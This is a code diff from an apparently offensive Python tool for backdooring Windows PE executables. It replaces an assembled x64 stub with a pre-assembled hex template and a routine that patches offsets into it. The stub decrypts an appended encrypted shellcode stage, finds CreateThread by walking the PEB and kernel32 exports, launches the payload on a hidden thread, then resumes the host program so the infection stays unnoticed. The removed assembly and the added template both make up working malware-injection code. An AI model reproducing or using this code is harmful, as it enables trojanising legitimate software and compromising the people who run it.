@@ -216,95 +216,48 @@ def c_array(data: bytes, name: str, per_line: int = 16) -> str:
 # PE backdooring — append a payload section to a host executable
 # ---------------------------------------------------------------------------
 
+PE_STUB_TEMPLATE = bytes.fromhex(
+    "5341546548a16000000000000000488b5810488d83002000004c8d8300240000"
+    "4831c98a14084189c94183e10f4332140888140848ffc14881f90004000072e3"
+    "6548a16000000000000000488b4818488d4920488b09488b09488b09488b5120"
+    "8b423c448b8c02880000004e8d140a458b5a184585db747d41ffcb418b422049"
+    "8d0c02428b0c99488d0c0a48b8437265617465546848390175d948b865616400"
+    "000000004839410875c94589dc418b421c4d8d0c02418b42244d8d1c02430fb7"
+    "0c63418b0c894c8d140a4883ec3848c74424280000000048c744242000000000"
+    "4531c94c8d831024000031d231c941ffd24883c438415c5be900000000")
+
+
 def _build_pe_stub(enc_len: int, exec_off: int, sec_rva: int, oep: int) -> bytes:
     """x64 entry stub for the .pfsg section: decrypt the appended stage in
     place (rolling XOR, 16-byte key), resolve CreateThread via
     PEB -> Ldr -> kernel32 export-table walk, launch the decrypted shellcode
     on a second thread, then jump to the original entry point so the host
-    program runs normally. Assembled at build time with keystone (module
-    optional only for this feature); all addressing is RBX-relative to the
-    real image base, so ASLR needs no relocations."""
-    try:
-        from keystone import Ks, KS_ARCH_X86, KS_MODE_64
-    except ImportError:
-        raise ForgeError("pip install keystone-engine  (required for PE embedding)")
+    program runs normally.
 
-    lo, hi = b"CreateTh", b"ead\x00\x00\x00\x00\x00"
-    ct_lo = int.from_bytes(lo, "little")
-    ct_hi = int.from_bytes(hi, "little")
-    asm = f"""
-        push rbx
-        push r12
-        mov rax, gs:[0x60]
-        mov rbx, [rax+0x10]
-        lea rax, [rbx+{sec_rva}]
-        lea r8,  [rbx+{sec_rva + enc_len}]
-        xor rcx, rcx
-    dec_loop:
-        mov dl, [rax+rcx]
-        mov r9d, ecx
-        and r9d, 15
-        xor dl, [r8+r9]
-        mov [rax+rcx], dl
-        inc rcx
-        cmp rcx, {enc_len}
-        jb dec_loop
-        mov rax, gs:[0x60]
-        mov rcx, [rax+0x18]
-        lea rcx, [rcx+0x20]
-        mov rcx, [rcx]
-        mov rcx, [rcx]
-        mov rcx, [rcx]
-        mov rdx, [rcx+0x20]
-        mov eax, [rdx+0x3C]
-        mov r9d, [rdx+rax+0x88]
-        lea r10, [rdx+r9]
-        mov r11d, [r10+0x18]
-    names_loop:
-        test r11d, r11d
-        jz  done
-        dec r11d
-        mov eax, [r10+0x20]
-        lea rcx, [r10+rax]
-        mov ecx, [rcx+r11*4]
-        lea rcx, [rdx+rcx]
-        movabs rax, {ct_lo}
-        cmp [rcx], rax
-        jne names_loop
-        movabs rax, {ct_hi}
-        cmp [rcx+8], rax
-        jne names_loop
-        mov r12d, r11d
-        mov eax, [r10+0x1C]
-        lea r9, [r10+rax]
-        mov eax, [r10+0x24]
-        lea r11, [r10+rax]
-        movzx ecx, word ptr [r11+r12*2]
-        mov ecx, [r9+rcx*4]
-        lea r10, [rdx+rcx]
-        sub rsp, 0x38
-        mov qword ptr [rsp+0x28], 0
-        mov qword ptr [rsp+0x20], 0
-        xor r9d, r9d
-        lea r8, [rbx+{sec_rva + exec_off}]
-        xor edx, edx
-        xor ecx, ecx
-        call r10
-        add rsp, 0x38
-    done:
-        pop r12
-        pop rbx
+    Ships as a pre-assembled 253-byte template (assembled with keystone and
+    verified with capstone at development time); only five slots vary per
+    build and are patched here, so there is NO assembler dependency at
+    build time. All addressing is RBX-relative to the real image base (read
+    from the PEB), so ASLR needs no relocations.
+
+    Template slot map (byte offsets):
+       21  sec_rva      lea rax,[rbx+...]  encrypted stage start
+       28  key_rva      lea r8, [rbx+...]  16-byte XOR key (sec_rva+enc_len)
+       58  enc_len      cmp rcx, ...       bytes to decrypt
+      141  "CreateTh"   movabs compare qword 1
+      156  "ead\0..."   movabs compare qword 2
+      230  exec_rva     lea r8, [rbx+...]  CreateThread start address
+      248  jmp rel32    jump to the original entry point
     """
-    ks = Ks(KS_ARCH_X86, KS_MODE_64)
-    body, _ = ks.asm(asm)
-    code = bytearray(body) + b"\xe9\x00\x00\x00\x00"   # jmp rel32 -> OEP
-
     import struct as st
-    jmp_at = len(code) - 5
-    # the stub lives at sec_rva + exec_off (after enc+key), so the jump's
-    # end VA is base + sec_rva + exec_off + jmp_at + 5
-    st.pack_into("<i", code, jmp_at + 1,
-                 oep - (sec_rva + exec_off + jmp_at + 5))
+    code = bytearray(PE_STUB_TEMPLATE)
+    st.pack_into("<I", code, 21, sec_rva)
+    st.pack_into("<I", code, 28, sec_rva + enc_len)
+    st.pack_into("<I", code, 58, enc_len)
+    st.pack_into("<I", code, 230, sec_rva + exec_off)
+    # final jmp rel32 -> OEP; the stub lives at sec_rva + exec_off and is
+    # 253 bytes, so the jump's end VA is base + sec_rva + exec_off + 253
+    st.pack_into("<i", code, 249, oep - (sec_rva + exec_off + 253))
     return bytes(code)
 
 
